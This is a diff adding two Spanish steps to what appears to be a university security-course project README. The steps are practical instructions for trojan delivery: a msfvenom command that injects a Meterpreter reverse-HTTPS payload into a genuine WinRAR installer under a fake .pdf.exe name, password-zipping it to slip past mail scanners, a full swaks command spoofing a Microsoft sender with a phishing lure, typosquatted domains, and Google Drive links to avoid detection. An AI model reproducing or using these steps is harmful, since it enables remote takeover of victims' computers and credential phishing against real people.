@@ -192,6 +192,92 @@ grupo4-seguridad/
 
 ---
 
+## Paso 6 - Crear el .exe que parece un archivo legítimo
+
+El archivo que genera msfvenom por defecto se ve como un ejecutable genérico de Windows. Para que la víctima lo abra sin sospechar, hay que disfrazarlo para que parezca un documento de Word, un PDF o una imagen.
+
+El truco de la doble extensión funciona porque Windows oculta las extensiones de archivo por defecto. Si el archivo se llama así:
+
+```
+Documento_Proyecto.pdf.exe
+```
+
+La víctima solo va a ver esto en su pantalla:
+
+```
+Documento_Proyecto.pdf
+```
+
+Para que además tenga el ícono de un PDF de verdad, dentro de Kali instalas esta herramienta:
+
+```
+sudo apt-get install icoutils
+```
+
+Descargas un ícono de PDF en formato .ico y se lo asignas al ejecutable con wrestool. Pero la forma más rápida para la demo es usar un instalador real como plantilla al momento de generar el payload. Metasploit puede inyectar el payload dentro de un ejecutable legítimo y el resultado hereda el ícono y la firma visual del original:
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -x /ruta/instalador_real.exe -f exe -o Documento_Proyecto.pdf.exe
+```
+
+Donde `-x /ruta/instalador_real.exe` es cualquier ejecutable de Windows que tengas a la mano, por ejemplo un instalador de WinRAR o de VLC que descargues en Kali con:
+
+```
+wget https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -O instalador_real.exe
+```
+
+El archivo resultante tiene el ícono de WinRAR, abre WinRAR cuando la víctima lo ejecuta, y al mismo tiempo abre la conexión hacia tu máquina sin que nadie se dé cuenta.
+
+Para comprimir el archivo con contraseña antes de enviarlo:
+
+```
+zip -e archivo_protegido.zip Documento_Proyecto.pdf.exe
+```
+
+Te pide que pongas una contraseña. Esa contraseña la incluyes en el cuerpo del correo. Los escáneres de los servidores de correo no pueden ver dentro de un zip con contraseña, así que el archivo pasa sin ser detectado.
+
+---
+
+## Paso 7 - Hacer que el correo no parezca falso
+
+Un correo que parece legítimo es la diferencia entre que la víctima abra el archivo o lo mande directo a la papelera. Hay varias formas de lograrlo.
+
+La primera es usar un servicio que te deja enviar correos desde cualquier dirección sin tener acceso a esa cuenta. Esto se llama email spoofing y funciona porque no todos los servidores de correo verifican que el remitente sea real. Desde Kali puedes usar swaks para hacer esto:
+
+```
+sudo apt-get install swaks
+```
+
+Y envías el correo así:
+
+```
+swaks --to victima@correo.com --from soporte@microsoft.com --server smtp.gmail.com:587 --auth LOGIN --auth-user TU_CORREO@gmail.com --auth-password TU_PASSWORD --tls --header "Subject: Actualización de seguridad requerida" --body "Se ha detectado actividad inusual en su cuenta. Descargue el archivo adjunto para verificar su identidad. Contraseña del archivo: 1234" --attach archivo_protegido.zip
+```
+
+Lo que esto hace es mandar el correo usando tu cuenta de Gmail como servidor, pero poniendo `soporte@microsoft.com` como remitente visible. Muchos clientes de correo muestran solo el nombre del remitente, no la dirección real, así que la víctima ve "Soporte Microsoft" sin cuestionar nada.
+
+La segunda forma es registrar un dominio que se parezca al real. Esto se llama typosquatting. Por ejemplo si la víctima espera un correo de su empresa que usa `empresa.com`, tú registras `empresa-soporte.com` o `empresa.com.co` y mandas el correo desde ahí. El costo de registrar un dominio es de unos tres dólares y le da mucha más credibilidad al correo.
+
+La tercera forma, que es la más efectiva para una demo controlada, es subir el archivo a Google Drive y mandar solo el link en el correo. Google Drive no escanea ejecutables, y un link de Drive se ve completamente legítimo. El correo queda así de simple:
+
+```
+Asunto: Documento del proyecto - revisión final
+
+Hola,
+
+Te comparto el documento actualizado para que lo revises antes de la presentación.
+
+Link: https://drive.google.com/file/d/XXXXXXXXXXXX
+
+Cualquier duda me avisas.
+```
+
+Sin adjuntos sospechosos, sin archivos zip, sin nada que levante alarmas. La víctima hace clic en un link de Google que parece completamente normal, descarga el archivo y lo abre.
+
+Para que el correo se vea todavía más real, puedes agregarle una firma con nombre, cargo y número de teléfono inventados. La mayoría de las personas no verifica si el número de teléfono de una firma existe o no.
+
+---
+
 ## Información del grupo
 
 Proyecto de la materia de Seguridad Informática.
